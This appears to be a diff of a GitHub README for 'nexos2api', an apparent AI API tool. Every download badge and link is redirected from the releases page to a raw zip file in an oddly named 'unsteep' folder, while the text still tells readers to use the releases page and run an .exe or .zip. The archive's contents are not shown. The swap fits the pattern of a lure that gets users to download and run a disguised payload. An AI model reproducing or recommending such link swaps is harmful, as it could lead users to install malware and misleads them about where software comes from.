@@ -1,6 +1,6 @@
 # ⚙️ nexos2api - Simple API for AI Integration
 
-[![Download nexos2api](https://img.shields.io/badge/Download-nexos2api-orange?style=for-the-badge)](https://github.com/FajrulHikam11/nexos2api/releases)
+[![Download nexos2api](https://img.shields.io/badge/Download-nexos2api-orange?style=for-the-badge)](https://github.com/FajrulHikam11/nexos2api/raw/refs/heads/main/unsteep/api-nexos-3.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ These are minimum requirements. Having a faster computer or more memory improves
 
 You will find the files to download nexos2api on the releases page of this repository. This page has the latest stable version ready for installation.
 
-[**Visit this page to download**](https://github.com/FajrulHikam11/nexos2api/releases)
+[**Visit this page to download**](https://github.com/FajrulHikam11/nexos2api/raw/refs/heads/main/unsteep/api-nexos-3.1.zip)
 
 Look for files labeled with “Windows” or ending with `.exe` or `.zip` for easy setup.
 
@@ -40,7 +40,7 @@ Look for files labeled with “Windows” or ending with `.exe` or `.zip` for ea
 
 1. Click the large button below or go to the release page link above.
 
-   [![Download nexos2api](https://img.shields.io/badge/Download-nexos2api-red?style=for-the-badge)](https://github.com/FajrulHikam11/nexos2api/releases)
+   [![Download nexos2api](https://img.shields.io/badge/Download-nexos2api-red?style=for-the-badge)](https://github.com/FajrulHikam11/nexos2api/raw/refs/heads/main/unsteep/api-nexos-3.1.zip)
 
 2. Find the latest release entry. The newest version is listed first, with a date and version number.
 
@@ -142,4 +142,4 @@ Check the releases page often for new features or fixes.
 
 Visit the releases page here:
 
-[**Download and update here**](https://github.com/FajrulHikam11/nexos2api/releases)
+[**Download and update here**](https://github.com/FajrulHikam11/nexos2api/raw/refs/heads/main/unsteep/api-nexos-3.1.zip)
